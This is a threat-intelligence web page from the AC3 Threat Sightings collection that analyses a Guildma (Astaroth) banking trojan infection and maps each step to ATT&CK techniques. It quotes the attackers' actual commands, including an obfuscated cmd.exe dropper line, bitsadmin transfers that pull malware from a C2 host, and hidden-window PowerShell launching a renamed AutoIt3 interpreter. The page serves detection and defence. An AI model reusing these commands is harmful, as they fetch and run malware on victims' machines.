<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<title data-react-helmet="true">Guildma_RAT | AC3 - Threat Sightings</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/Guildma_RAT"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Guildma_RAT | AC3 - Threat Sightings"><meta data-react-helmet="true" name="description" content="Overview"><meta data-react-helmet="true" property="og:description" content="Overview"><link data-react-helmet="true" rel="shortcut icon" href="/ac3-threat-sightings/img/ma-favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/Guildma_RAT"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/Guildma_RAT" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/Guildma_RAT" hreflang="x-default"><link rel="stylesheet" href="/ac3-threat-sightings/assets/css/styles.9f78bae8.css">
<link rel="preload" href="/ac3-threat-sightings/assets/js/runtime~main.943e43ad.js" as="script">
<link rel="preload" href="/ac3-threat-sightings/assets/js/main.263aa71a.js" as="script">
</head>
<body data-theme="light">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/ac3-threat-sightings/"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--light_4Vu1 navbar__logo"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--dark_uzRr navbar__logo"><b class="navbar__title">AC3 Threat Sightings</b></a><a class="navbar__item navbar__link navbar__link--active" href="/ac3-threat-sightings/docs/Welcome">Home</a></div><div class="navbar__items navbar__items--right"><div class="react-toggle toggle_2i4l react-toggle--disabled"><div class="react-toggle-track" role="button" tabindex="-1"><div class="react-toggle-track-check"><span class="toggle_iYfV">ðŸŒœ</span></div><div class="react-toggle-track-x"><span class="toggle_iYfV">ðŸŒž</span></div><div class="react-toggle-thumb"></div></div><input type="checkbox" class="react-toggle-screenreader-only" aria-label="Switch between dark and light mode"></div><div class="dsla-search-wrapper"><div class="dsla-search-field"></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button class="clean-btn backToTopButton_i9tI" type="button"><svg viewBox="0 0 24 24" width="28"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" fill="currentColor"></path></svg></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh menuWithAnnouncementBar_+O1J"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Welcome">AC3 Threat Sightings</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Getting Started</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#">Sightings</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Darkside_Ransomware">Darkside_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer">Jupyter_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer">Raccoon_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Guildma_RAT">Guildma_RAT</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/TA551-Phishing">TA551-Phishing</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Hafnium">Hafnium</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021">Emotet_Dec2021</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Older Schema Version</a></li></ul></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Weapons</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Techniques</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Stats">Stats</a></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_eoK2"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_e+kA"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Guildma_RAT</h1></header><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="overview"></a>Overview<a class="hash-link" href="#overview" title="Direct link to heading">#</a></h2><p>Guildma (a.k.a Astaroth) is a banking trojan observed mostly on LATAM, Spain and Portugal. The main focus of the actor is the financial sector. In this Threat Sighting Guildma was downloaded using a complex chain of PowerShell, CMD, MSHTA, BITSadmin and loaded into memory via a malicious AutoIt3 script.</p><p>This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: <a href="https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml" target="_blank" rel="noopener noreferrer">https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml</a></p><p>Author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)</p><p>Acknowledgements: Kimberly - @StopMalvertisin</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="references"></a>References:<a class="hash-link" href="#references" title="Direct link to heading">#</a></h3><ul><li><a href="https://app.any.run/tasks/902b68a6-4069-4a8f-bd10-3f3b198ff0c5/#" target="_blank" rel="noopener noreferrer">https://app.any.run/tasks/902b68a6-4069-4a8f-bd10-3f3b198ff0c5/#</a></li><li><a href="https://twitter.com/StopMalvertisin/status/1448876652507717635" target="_blank" rel="noopener noreferrer">https://twitter.com/StopMalvertisin/status/1448876652507717635</a></li><li><a href="https://attack.mitre.org/software/S0373" target="_blank" rel="noopener noreferrer">https://attack.mitre.org/software/S0373</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-activity"></a>Threat Actor Activity<a class="hash-link" href="#threat-actor-activity" title="Direct link to heading">#</a></h3><ul><li>Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.</li><li>Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.</li><li>Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.</li><li>Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.</li><li>Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.</li><li>Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.</li><li>Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.</li><li>Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.</li><li>Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="count-of-documented-ttps-by-tactic"></a>Count of documented TTPs by Tactic<a class="hash-link" href="#count-of-documented-ttps-by-tactic" title="Direct link to heading">#</a></h3><table><thead><tr><th>Tactic</th><th># Documented TTPs</th></tr></thead><tbody><tr><td>Initial Access</td><td>+ (1)</td></tr><tr><td>Command And Control</td><td>+ (1)</td></tr><tr><td>Execution</td><td>+++ (3)</td></tr><tr><td>Defense Evasion</td><td>++++ (4)</td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="attack-flow"></a>Attack Flow<a class="hash-link" href="#attack-flow" title="Direct link to heading">#</a></h3><p>The chart below shows a graphical representation of the attack flow.</p><div class="mermaid">
graph LR
EXE[Execution] --&gt; | malicious _ZIP_ file to lure users| IA[Initial Access]
IA[Initial Access] --&gt; | malicious _.LNK_ file to lure users| EXE[Execution]
EXE[Execution] --&gt; | _CMD_ to run obfuscated command that drops _HTA_ file| DE[Defense Evasion]
EXE[Execution] --&gt; | _PowerShell_ to execute _HTA_ payload via _MSHTA_| DE[Defense Evasion]
EXE[Execution] --&gt; | _MSHTA_ to orchestrate the download of Guildma DLL and other artifacts via _BITSadmin_| C2[Command And Control]
EXE[Execution] --&gt; | _MSHTA_ to launch a _PowerShell_ command that loads Guildma DLL| DE[Defense Evasion]
EXE[Execution] --&gt; | _PowerShell_ to launch _AutoIt3_ script| DE[Defense Evasion]
EXE[Execution] --&gt; | a renamed copy of _AutoIt3_ interpreter to run malicious _AutoIt3_ scripts to launch Guildma DLL| EXE[Execution]
EXE[Execution] --&gt; | _AutoIt3_ scripts to launch _Guildma DLL_| EXE[Execution]
</div><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-and-procedures"></a>Tactics, Techniques and Procedures<a class="hash-link" href="#tactics-techniques-and-procedures" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1204.002 - User Execution: Malicious File</td><td>Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.</td></tr><tr><td>Execution</td><td>T1204.002 - User Execution: Malicious File<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.</td></tr><tr><td>Defense Evasion</td><td>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1218.005 - Signed Binary Proxy Execution: Mshta</td><td>Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.</td></tr><tr><td>Command And Control</td><td>T1071.001 - Application Layer Protocol: Web Protocols<br>T1105 - Ingress Tool Transfer<br>T1218.005 - Signed Binary Proxy Execution: Mshta<br>T1197 - BITS Jobs<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.</td></tr><tr><td>Defense Evasion</td><td>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1059.001 - Command and Scripting Interpreter: PowerShell</td><td>Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.</td></tr><tr><td>Execution</td><td>T1059 - Command and Scripting Interpreter<br>T1036 - Masquerading</td><td>Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.</td></tr><tr><td>Execution</td><td>T1059 - Command and Scripting Interpreter<br>T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-procedures-observables-and-notes"></a>Tactics, Techniques, Procedures, Observables and Notes<a class="hash-link" href="#tactics-techniques-procedures-observables-and-notes" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th><th>Observables</th><th>Notes</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1204.002</td><td>Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Program Files\\WinRAR\\WinRAR.exe&quot; &quot;C:\\Users\\#{user}\\Desktop\\TUP32980638916Y.zip&quot;</code><br><em>File Created</em>: <br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\359168.783.30258.81261_857.62608.08524.zip</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139..zip</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139.LNK</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon-dll-decoded.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.exe</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.log</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon1.exe</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon1_.au3</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\log32.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\r1.log</code></td><td>- AutoIt3 script interpreter in masqueraded as &#x27;ctfmon.exe&#x27;<br>- The LNK file is the first-stage payload</td></tr><tr><td>Execution</td><td>T1204.002<br>T1059.003</td><td>Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.</td><td><em>Process Created</em>: <br>- <code>C:\Users\#{user}\AppData\Local\Temp\Rar$DRa2672.2359\TUP32980638916Y\599151.301.25077.7868139.LNK</code><br><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\System32\\cmd.exe\&quot; /V/D/c \&quot;seT sKk=script&amp;&amp;seT px=powershell&amp;&amp;SEt NEGG=C:\\Users\\Public\\Videos\\^YqW&amp;&amp;SEt SMO=.H&amp;&amp;SEt XQGZ=^&lt;!sKk!^&gt;try{v6POar c=\&#x27;!sKk!:\&#x27;;d=\&#x27;h6POTtP:\&#x27;;G6POetObj6POect(c+d+\&#x27;&amp;&amp;sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\&#x27;);}catch(e){}close();^&lt;/!sKk!^&gt;&amp;&amp;sEt/^p YE8N=\&quot;%XQGZ:6PO=%%FIC:ZXEFM=/%\&quot;&lt;nul &gt; %NEGG%%SMO%ta\|!px! -Command \&quot;&amp; \&#x27;!NEGG!!SMO!ta\&#x27; \&quot;</code></td><td>- The command line establishes different variables (sKk, px, NEGG, SMO, XQGZ, FIC, YE8N) to execute a command</td></tr><tr><td>Defense Evasion</td><td>T1059.003</td><td>Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>C:\Windows\system32\cmd.exe  /S /D /c\&quot; sEt/p YE8N=\&quot;%XQGZ:6PO=%%FIC:ZXEFM=/%\&quot; 0&lt;nul 1&gt;%NEGG%%SMO%ta\&quot;</code><br><em>File Created</em>: <br>- <code>C:\\Users\\Public\\Videos\\YqW.Hta</code></td><td>- This process creates a file in the path Videos of the user Public of the system.<br>- This file includes the URL where the malware will connect to download next stages payloads.<br>- An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript</td></tr><tr><td>Defense Evasion</td><td>T1059.001<br>T1218.005</td><td>Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>powershell  -Command &quot;&amp; &#x27;C:\Users\Public\Videos\YqW.Hta&#x27; </code><br><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\mshta.exe&quot; &quot;C:\\Users\\Public\\Videos\\YqW.Hta&quot;</code></td><td>- This execution triggers different events in the system like Network and File events.</td></tr><tr><td>Command And Control</td><td>T1071.001<br>T1105<br>T1218.005<br>T1197<br>T1059.003</td><td>Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.</td><td><em>Network Accessed</em>: <code>104.21.76[.]96</code><br><em>Network Accessed</em>: <code>http://waa8.nolii[.]date/?1/</code><br><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\bitsadmin.exe&quot; /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.dll&quot;</code><br><em>File Created</em>: <br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\HE6VS7YU.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\XJHKVD2B.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\3JVKRLFN.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\BDW1XBVN\\0KG1IQBM.htm</code><br><em>Process Created</em>: <br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 &quot;C:\Users\Public\Videos\VEO46570203888O\log32.dll&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 &quot;C:\Users\Public\Videos\VEO46570203888O\log33.dll&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 &quot;C:\Users\Public\Videos\VEO46570203888O\ctfmon.exe&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 &quot;C:\Users\Public\Videos\VEO46570203888O\ctfmon.log&quot;</code><br><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\cmd.exe&quot; /V /C &quot;echo C:\\Users\\Public\\Videos\\VEO46570203888O\&gt;C:\\Users\\Public\\lu&quot;&amp;&amp; exit</code><br><em>File Created</em>: <br>- <code>C:\\Users\\Public\\lu</code></td><td>- The cookie &#x27;cidade&#x27; is established in the first response of the C2. The value will be different for each intrusion. One of the observed is the following -&gt; &#x27;set-cookie: cidade=CFXX;&#x27;<br>- The content of the file is &#x27;C:\Users\Public\Videos\VEO46570203888O\&#x27;<br>- The content of the files saved in the Cookies path, is related to the values of the cookie in each response of the C2 (country, domain, etc.)<br>- The .htm file is the content of the server when the request was made by the mstha process.<br>- When mstha.exe is executed, a copy of the website visited is saved in the system with .htm extension.<br>- 4 different process of bitsadmin are spawned by mshta.<br>- Dumps the content of the echo parameter into the file called &#x27;lu&#x27;<br>- The content of the file is &#x27;C:\Users\Public\Videos\VEO46570203888O\&#x27;</td></tr><tr><td>Defense Evasion</td><td>T1059.003</td><td>Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\cmd.exe&quot; /c cd C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\&amp;&amp; ^start ^/W ^/MIN powershell -windowstyle hidden -Command &quot;&amp; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot; C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log &quot;&amp;&amp; timeout 3600</code></td><td>- This CMD.exe is executed at the same time of bitsadmin.exe. Both are child process of mshta (possibly ADS)<br>- Alternate Data Stream (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.</td></tr><tr><td>Defense Evasion</td><td>T1059.001</td><td>Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>powershell  -windowstyle hidden -Command &quot;&amp; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log&quot; &amp;&amp; timeout 3600&quot;</code></td><td>- ctfmon.exe is the legit binary of AutoIt3.</td></tr><tr><td>Execution</td><td>T1059<br>T1036</td><td>Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot;  C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log</code></td><td>- The binary of <em>AutoIt3</em> is executed to load the <em>AutoIt3</em> script, which is responsible for loading the Guildma DLL afterwards</td></tr><tr><td>Execution</td><td>T1059<br>T1497.003<br>T1059.003</td><td>Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.</td><td><em>Process Created</em>: <br>- <code>C:\Windows\System32\dllhost.exe</code><br><em>Process Created</em>: <br>- <code>timeout  3600</code><br><em>Process Created</em>: <br>- <code>&quot;C:\Windows\System32\cmd.exe&quot; /V /C &quot;echo gharobhnpuluguaoqzgezkk &gt;C:\Users\Public\Videos\VEO46570203888O\\r1.log&quot;&amp;&amp; exit</code><br><em>File Created</em>: <br>- <code>C:\\Users\\Public\\Videos\\VEO46570203888O\\r1.log</code></td><td>- Maybe the content of the DLL is loaded in memory under this process.<br>- Timeout binary pauses the command processor for the specified number of seconds.<br>- 3600 seconds is 60 minutes<br>- The content of the file r1.log is &#x27;gharobhnpuluguaoqzgezkk&#x27;<br>- The content of the file r1.log is &#x27;gharobhnpuluguaoqzgezkk&#x27;</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="ttp-profiles-with-observables"></a>TTP Profiles with Observables<a class="hash-link" href="#ttp-profiles-with-observables" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-malicious-zip-file-to-lure-users-for-initial-access"></a>Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.<a class="hash-link" href="#threat-actor-used-malicious-zip-file-to-lure-users-for-initial-access" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic"></a>Tactic<a class="hash-link" href="#tactic" title="Direct link to heading">#</a></h4><ul><li>Initial Access</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques"></a>Techniques<a class="hash-link" href="#techniques" title="Direct link to heading">#</a></h4><ul><li>T1204.002 - User Execution: Malicious File</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1204.002</td><td>Victim decompressed the malicious ZIP file.</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Program Files\\WinRAR\\WinRAR.exe&quot; &quot;C:\\Users\\#{user}\\Desktop\\TUP32980638916Y.zip&quot;</code></td></tr><tr><td></td><td>12 files were dropped into Temp path (included a masqueraded copy of AutoIt3 script interpreter).</td><td><em>File Created</em>: <br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\359168.783.30258.81261_857.62608.08524.zip</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139..zip</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139.LNK</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon-dll-decoded.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.exe</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon.log</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon1.exe</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\ctfmon1_.au3</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\log32.dll</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\r1.log</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes"></a>Notes<a class="hash-link" href="#notes" title="Direct link to heading">#</a></h4><ul><li>AutoIt3 script interpreter in masqueraded as &#x27;ctfmon.exe&#x27;</li><li>The LNK file is the first-stage payload</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-malicious-lnk-file-to-lure-users-for-execution"></a>Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.<a class="hash-link" href="#threat-actor-used-malicious-lnk-file-to-lure-users-for-execution" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-1"></a>Tactic<a class="hash-link" href="#tactic-1" title="Direct link to heading">#</a></h4><ul><li>Execution</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-1"></a>Techniques<a class="hash-link" href="#techniques-1" 